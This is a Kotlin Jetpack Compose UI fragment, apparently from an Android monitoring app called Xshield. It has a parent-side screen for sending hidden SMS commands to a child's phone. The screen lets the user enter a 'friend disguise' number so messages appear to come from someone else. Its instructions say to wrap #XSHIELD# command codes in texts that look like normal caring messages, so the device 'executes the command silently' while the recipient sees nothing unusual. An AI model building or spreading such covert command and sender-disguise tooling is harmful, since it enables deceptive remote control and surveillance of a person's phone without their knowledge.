                        color = Color.White.copy(alpha = 0.75f), fontSize = 12.sp, lineHeight = 16.sp
                    )
                }
            }
        }

        // ── Setup: Parent Number ──────────────────────────────────────────────────
        var parentInput by androidx.compose.runtime.remember(parentPhone) { mutableStateOf(parentPhone) }
        var parentSaved by androidx.compose.runtime.remember { mutableStateOf(false) }

        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(14.dp),
            colors = CardDefaults.cardColors(
                containerColor = if (isParentConfigured) Color(0xFFE8F5E9) else Color(0xFFFFF8E1)
            ),
            border = BorderStroke(1.5.dp, if (isParentConfigured) Color(0xFF4CAF50) else Color(0xFFFFA000))
        ) {
            Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        if (isParentConfigured) Icons.Default.CheckCircle else Icons.Default.Phone,
                        contentDescription = null,
                        tint = if (isParentConfigured) Color(0xFF2E7D32) else Color(0xFFE65100),
                        modifier = Modifier.size(18.dp)
                    )
                    Text(
                        "Your Phone Number (Parent)",
                        fontWeight = FontWeight.Bold, fontSize = 13.sp,
                        color = if (isParentConfigured) Color(0xFF1B5E20) else Color(0xFFBF360C)
                    )
                }
                Text("Child device only accepts commands from this number.", fontSize = 11.sp, color = Color(0xFF757575))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    OutlinedTextField(
                        value = parentInput,
                        onValueChange = { parentInput = it; parentSaved = false },
                        placeholder = { Text("+91XXXXXXXXXX", fontSize = 12.sp, color = Color(0xFFBDBDBD)) },
                        modifier = Modifier.weight(1f), singleLine = true,
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Color(0xFF1A237E),
                            unfocusedBorderColor = if (isParentConfigured) Color(0xFF4CAF50) else Color(0xFFFFA000),
                            focusedTextColor = Color(0xFF1A1A2E), unfocusedTextColor = Color(0xFF1A1A2E)
                        ),
                        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                    )
                    Button(
                        onClick = {
                            XshieldRepository.setParentPhoneNumber(parentInput.trim())
                            parentSaved = true
                            Toast.makeText(context, "✓ Parent number saved!", Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1A237E)),
                        shape = RoundedCornerShape(10.dp),
                        contentPadding = PaddingValues(horizontal = 14.dp, vertical = 14.dp)
                    ) { Text("SAVE", color = Color.White, fontSize = 12.sp, fontWeight = FontWeight.Bold) }
                }
                if (parentSaved || isParentConfigured) {
                    Text("✓ Active: $parentPhone", fontSize = 11.sp, color = Color(0xFF2E7D32))
                }
            }
        }

        // ── Setup: Child Phone Number ─────────────────────────────────────────────
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(14.dp),
            colors = CardDefaults.cardColors(
                containerColor = if (childPhoneSaved) Color(0xFFE3F2FD) else Color(0xFFFFF8E1)
            ),
            border = BorderStroke(1.5.dp, if (childPhoneSaved) Color(0xFF2196F3) else Color(0xFFFFA000))
        ) {
            Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        if (childPhoneSaved) Icons.Default.CheckCircle else Icons.Default.PhoneAndroid,
                        contentDescription = null,
                        tint = if (childPhoneSaved) Color(0xFF1565C0) else Color(0xFFE65100),
                        modifier = Modifier.size(18.dp)
                    )
                    Text(
                        "Child's Phone Number (SIM)",
                        fontWeight = FontWeight.Bold, fontSize = 13.sp,
                        color = if (childPhoneSaved) Color(0xFF0D47A1) else Color(0xFFBF360C)
                    )
                }
                Text("Commands will be sent directly to this number.", fontSize = 11.sp, color = Color(0xFF757575))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    OutlinedTextField(
                        value = childPhone,
                        onValueChange = { childPhone = it; childPhoneSaved = false },
                        placeholder = { Text("+91XXXXXXXXXX", fontSize = 12.sp, color = Color(0xFFBDBDBD)) },
                        modifier = Modifier.weight(1f), singleLine = true,
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Color(0xFF1A237E),
                            unfocusedBorderColor = if (childPhoneSaved) Color(0xFF2196F3) else Color(0xFFFFA000),
                            focusedTextColor = Color(0xFF1A1A2E), unfocusedTextColor = Color(0xFF1A1A2E)
                        ),
                        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                    )
                    Button(
                        onClick = {
                            val trimmed = childPhone.trim()
                            prefs.edit().putString("child_phone_number", trimmed).apply()
                            XshieldRepository.setChildPhoneNumber(trimmed)
                            childPhoneSaved = true
                            Toast.makeText(context, "✓ Child number saved!", Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1565C0)),
                        shape = RoundedCornerShape(10.dp),
                        contentPadding = PaddingValues(horizontal = 14.dp, vertical = 14.dp)
                    ) { Text("SAVE", color = Color.White, fontSize = 12.sp, fontWeight = FontWeight.Bold) }
                }
                if (childPhoneSaved) {
                    Text("✓ Sending to: $childPhone", fontSize = 11.sp, color = Color(0xFF1565C0))
                }
            }
        }

        // ── Setup: Friend Disguise Number (Optional) ──────────────────────────────
        var disguiseInput by androidx.compose.runtime.remember(friendDisguisePhone) { mutableStateOf(friendDisguisePhone) }
        var disguiseSaved by androidx.compose.runtime.remember { mutableStateOf(false) }

        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(14.dp),
            colors = CardDefaults.cardColors(
                containerColor = if (isDisguiseConfigured) Color(0xFFF3E5F5) else Color(0xFFFAFAFA)
            ),
            border = BorderStroke(1.5.dp, if (isDisguiseConfigured) Color(0xFFAB47BC) else Color(0xFFE0E0E0))
        ) {
            Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        if (isDisguiseConfigured) Icons.Default.CheckCircle else Icons.Default.Face,
                        contentDescription = null,
                        tint = if (isDisguiseConfigured) Color(0xFF7B1FA2) else Color(0xFF757575),
                        modifier = Modifier.size(18.dp)
                    )
                    Text(
                        "Friend Disguise Number (Optional)",
                        fontWeight = FontWeight.Bold, fontSize = 13.sp,
                        color = if (isDisguiseConfigured) Color(0xFF4A148C) else Color(0xFF424242)
                    )
                }
                Text("Simulates SMS from this number on the child's phone, hiding your parent number.", fontSize = 11.sp, color = Color(0xFF757575))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    OutlinedTextField(
                        value = disguiseInput,
                        onValueChange = { disguiseInput = it; disguiseSaved = false },
                        placeholder = { Text("Friend's number (e.g. +91XXXXXXXXXX)", fontSize = 12.sp, color = Color(0xFFBDBDBD)) },
                        modifier = Modifier.weight(1f), singleLine = true,
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Color(0xFF7B1FA2),
                            unfocusedBorderColor = if (isDisguiseConfigured) Color(0xFFAB47BC) else Color(0xFFE0E0E0),
                            focusedTextColor = Color(0xFF1A1A2E), unfocusedTextColor = Color(0xFF1A1A2E)
                        ),
                        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                    )
                    Button(
                        onClick = {
                            XshieldRepository.setFriendDisguiseNumber(disguiseInput.trim())
                            disguiseSaved = true
                            Toast.makeText(context, "✓ Disguise number saved!", Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7B1FA2)),
                        shape = RoundedCornerShape(10.dp),
                        contentPadding = PaddingValues(horizontal = 14.dp, vertical = 14.dp)
                    ) { Text("SAVE", color = Color.White, fontSize = 12.sp, fontWeight = FontWeight.Bold) }
                }
                if (disguiseSaved || isDisguiseConfigured) {
                    Text("✓ Disguising as: $friendDisguisePhone", fontSize = 11.sp, color = Color(0xFF7B1FA2))
                }
            }
        }

        // ── Commands Section Label ────────────────────────────────────────────────
        Spacer(modifier = Modifier.height(4.dp))
        Text(
            "  SEND A COMMAND",
            fontSize = 11.sp, fontWeight = FontWeight.Bold,
            color = Color(0xFF9E9E9E), letterSpacing = 1.2.sp
        )

        // ── Command Cards ─────────────────────────────────────────────────────────
        commands.forEachIndexed { index, cmd ->
            val msgState = messageStates[index]

            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(14.dp),
                colors = CardDefaults.cardColors(containerColor = Color.White),
                elevation = CardDefaults.cardElevation(defaultElevation = 3.dp)
            ) {
                Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {

                    // Header row: icon + label + category chip
                    Row(
                        horizontalArrangement = Arrangement.spacedBy(12.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .size(40.dp)
                                .background(cmd.categoryColor.copy(alpha = 0.12f), RoundedCornerShape(10.dp)),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(cmd.icon, contentDescription = null, tint = cmd.categoryColor, modifier = Modifier.size(20.dp))
                        }
                        Column(modifier = Modifier.weight(1f)) {
                            Text(cmd.label, fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFF1A1A2E))
                            Text(cmd.description, fontSize = 11.sp, color = Color(0xFF9E9E9E), lineHeight = 15.sp)
                        }
                        Box(
                            modifier = Modifier
                                .background(cmd.categoryColor.copy(alpha = 0.1f), RoundedCornerShape(4.dp))
                                .padding(horizontal = 6.dp, vertical = 2.dp)
                        ) {
                            Text(cmd.category.uppercase(), fontSize = 8.sp, fontWeight = FontWeight.Bold, color = cmd.categoryColor, letterSpacing = 0.6.sp)
                        }
                    }

                    // Editable disguised message field
                    Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                        Text("Disguised message (edit freely):", fontSize = 10.sp, color = Color(0xFF9E9E9E), fontWeight = FontWeight.Medium)
                        OutlinedTextField(
                            value = msgState.value,
                            onValueChange = { msgState.value = it },
                            modifier = Modifier.fillMaxWidth(),
                            minLines = 2,
                            maxLines = 4,
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = cmd.categoryColor,
                                unfocusedBorderColor = Color(0xFFE0E0E0),
                                focusedTextColor = Color(0xFF1A1A2E),
                                unfocusedTextColor = Color(0xFF1A1A2E),
                                focusedContainerColor = Color(0xFFFAFAFA),
                                unfocusedContainerColor = Color(0xFFFAFAFA)
                            ),
                            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp, lineHeight = 18.sp),
                            shape = RoundedCornerShape(10.dp)
                        )
                        // Command code hint
                        Text(
                            "Command embedded: ${cmd.command}",
                            fontSize = 10.sp,
                            color = cmd.categoryColor.copy(alpha = 0.8f),
                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace
                        )
                    }

                    // Send button
                    Button(
                        onClick = { sendSmsCommand(msgState.value) },
                        modifier = Modifier.fillMaxWidth(),
                        colors = ButtonDefaults.buttonColors(containerColor = cmd.categoryColor),
                        shape = RoundedCornerShape(10.dp),
                        contentPadding = PaddingValues(vertical = 12.dp)
                    ) {
                        Icon(Icons.Default.Send, contentDescription = null, tint = Color.White, modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Send to Child Device", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                    }
                }
            }
        }

        // ── Info Card ────────────────────────────────────────────────────────────
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(14.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFF3E5F5)),
            border = BorderStroke(1.dp, Color(0xFFCE93D8))
        ) {
            Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Info, contentDescription = null, tint = Color(0xFF7B1FA2), modifier = Modifier.size(16.dp))
                    Text("How Stealth Commands Work", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF4A148C))
                }
                Text("1. Edit the message to look like a normal caring text.", fontSize = 12.sp, color = Color(0xFF6A1B9A), lineHeight = 17.sp)
                Text("2. Keep the #XSHIELD#COMMAND anywhere inside the text.", fontSize = 12.sp, color = Color(0xFF6A1B9A), lineHeight = 17.sp)
                Text("3. Tap Send — the app sends SMS directly from your phone.", fontSize = 12.sp, color = Color(0xFF6A1B9A), lineHeight = 17.sp)
                Text("4. Child sees a normal message. Device executes the command silently.", fontSize = 12.sp, color = Color(0xFF6A1B9A), lineHeight = 17.sp)
            }
        }

        Spacer(modifier = Modifier.height(16.dp))
    }
}

@Composable
fun CommandsPlaceholder() {
    // Legacy — replaced by SmsCommandsScreen
    Text("Use SmsCommandsScreen instead.", color = LightText, fontSize = 12.sp)
}



@Composable
fun AccountPlaceholder() {
    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
        DetailItemRow("Client Email", "parent_hub_unlimited@xshield.com")
        DetailItemRow("Active Devices", "Unlimited Devices Connected")
        DetailItemRow("License Status", "Community Edition (Permanently Free)")
        DetailItemRow("Active Tracker Since", "2026-05-15")
        DetailItemRow("Expiry Date", "Lifetime Coverage")
        
        Spacer(modifier = Modifier.height(16.dp))
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0xFF5CB85C).copy(alpha = 0.15f), RoundedCornerShape(6.dp))
                .border(1.dp, Color(0xFF5CB85C), RoundedCornerShape(6.dp))
                .padding(12.dp),
            contentAlignment = Alignment.Center
        ) {
            Text(
                text = "ACTIVE COMMUNITY LICENSE • FULLY UNLOCKED",
                color = Color(0xFF2E7D32),
                fontSize = 12.sp,
                fontWeight = FontWeight.Bold
            )
        }
    }
}